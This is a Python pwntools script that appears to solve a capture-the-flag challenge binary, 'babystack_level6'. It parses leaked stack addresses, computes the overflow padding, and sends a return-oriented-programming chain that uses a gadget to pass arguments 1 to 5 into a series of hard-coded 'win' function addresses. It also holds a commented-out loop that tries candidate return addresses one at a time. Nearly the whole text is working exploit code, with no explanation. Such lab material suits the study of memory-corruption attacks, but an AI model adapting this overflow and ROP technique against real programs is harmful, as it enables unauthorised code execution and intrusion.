from pwn import *

win1 = [0x40135f, 0x401363, 0x401364, 0x401367, 0x40136b, 0x40136e, 0x401372, 0x401374,
0x401379, 0x40137e, 0x401381, 0x401388, 0x401389, 0x40138e, 0x401395, 0x40139a, 0x40139f, 0x4013a1, 0x4013a4, 0x4013a8, 0x4013aa, 0x4013ad,
0x4013b2, 0x4013b7, 0x4013bc, 0x4013be, 0x4013c5, 0x4013ca, 0x4013cf, 0x4013d4, 0x4013d5]


win2 =[0x4013d6,	
  0x4013da,	
  0x4013db,	
  0x4013de,	
  0x4013e2,	
  0x4013e5,	
  0x4013e9,	
  0x4013eb,	
  0x4013f0,	
  0x4013f5,	
  0x4013f8,	
  0x4013fb,
  0x4013fe,	
  0x401402,	
  0x401404,	
  0x401408,	
  0x40140d,	
  0x401414,	
  0x401419,	
  0x40141e,	
  0x401420,	
  0x401423,	
  0x401427,	
  0x401429,	
  0x40142c,	
  0x401431,	
  0x401436,	
  0x40143b,	
  0x40143d,	
  0x401444,	
  0x401449,	
  0x40144e,	
  0x401453,	
  0x401454]	

# for i in win2:
#     print(hex(i))
#     r = process("/challenge/babystack_level6")
#     r.recvuntil(b"base pointer rbp: ")
#     bp = int(r.recvline(keepends=False), 16)
#     r.recvuntil(b"will be stored: ")
#     buf = int(r.recvline(keepends=False), 16)
#     padding = bp - buf + 8
#     payload1 =  b'a'* padding + p64(i)
#     r.sendline(payload1)
#     r.interactive()

r = process("/challenge/babystack_level6")
r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)
r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)
padding = bp - buf + 8

payload1 =  b'a'* padding + p64(0x4018b3) + p64(0x1) + p64(0x40135f) + p64(0x4018b3) + p64(0x2) + p64(0x4013d6) + p64(0x4018b3) + p64(0x3) + p64(0x401455) + p64(0x4018b3) + p64(0x4) + p64(0x4014d4) + p64(0x4018b3) + p64(0x5) + p64(0x401553)
r.sendline(payload1)
r.interactive()

